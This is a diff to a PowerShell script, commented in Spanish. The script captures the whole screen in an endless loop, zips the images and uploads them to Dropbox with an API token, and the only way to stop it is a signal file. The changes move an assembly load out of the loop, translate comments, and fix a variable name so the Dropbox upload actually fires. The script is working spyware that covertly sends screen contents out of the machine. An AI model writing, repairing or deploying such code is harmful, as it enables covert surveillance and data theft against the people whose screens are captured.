@@ -23,7 +23,7 @@ public class DPI {
 }
 '@ -ReferencedAssemblies 'System.Drawing.dll' -ErrorAction Stop
 
-# Define la API Token de Dropbox
+# Define la API Token de Dropbox (Aquí debes agregar tu token)
 $db = ""
 
 # Archivo de señal para detener el script
@@ -48,6 +48,9 @@ function DropBox-Upload {
     Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
 }
 
+# Carga ensamblados necesarios solo una vez al inicio
+Add-Type -AssemblyName System.Windows.Forms,System.Drawing
+
 # Bucle principal para la captura de pantallas
 while ($true) {
     # Verificar si existe el archivo de señalización para detener el script
@@ -57,13 +60,10 @@ while ($true) {
         exit
     }
 
-    # Add necessary types
-    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
-
-    # Get virtual screen information
+    # Obtener información de la pantalla virtual
     $s = [System.Windows.Forms.SystemInformation]::VirtualScreen
 
-    # Create a bitmap of the virtual screen size
+    # Crear un bitmap del tamaño de la pantalla virtual
     $b = New-Object System.Drawing.Bitmap ([int32]([math]::round($($s.Width * [DPI]::scaling()), 0))),([int32]([math]::round($($s.Height * [DPI]::scaling()), 0)));
     [System.Drawing.Graphics]::FromImage($b).CopyFromScreen($s.Left, $s.Top, 0, 0, $b.Size)
 
@@ -82,7 +82,7 @@ while ($true) {
     $zipFile = "$userDir.zip"
 
     # Subir a Dropbox
-    if (-not ([string]::IsNullOrEmpty($dropboxToken))) {
+    if (-not ([string]::IsNullOrEmpty($db))) {
         DropBox-Upload -SourceFilePath $zipFile
     }
 
